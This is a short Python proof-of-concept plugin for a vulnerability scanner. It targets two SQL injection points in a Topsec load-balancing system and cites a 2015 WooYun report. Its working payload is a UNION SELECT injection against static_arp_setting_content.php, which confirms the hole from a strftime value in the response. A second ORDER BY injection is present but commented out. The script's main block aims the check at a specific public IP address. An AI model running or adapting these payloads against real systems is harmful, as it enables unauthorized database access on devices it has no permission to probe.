#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信负载均衡系统SQL注入漏洞 2处
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0118363
"""
import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = 'acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
    target = arg + payload    
    code, head, res, errcode, _ = curl.curl2(target);
    #strftime('%s','2015-11-11')=1447200000
    if '1447200000' in res:
        security_hole(target)
    # payload = 'acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%202--'
    # target = arg + payload
    # code, head, res, errcode, _ = curl.curl2(target);
    # if 'Fatal error' in res and 'ORDER BY' in res:
    #     security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://61.148.24.182/')[1])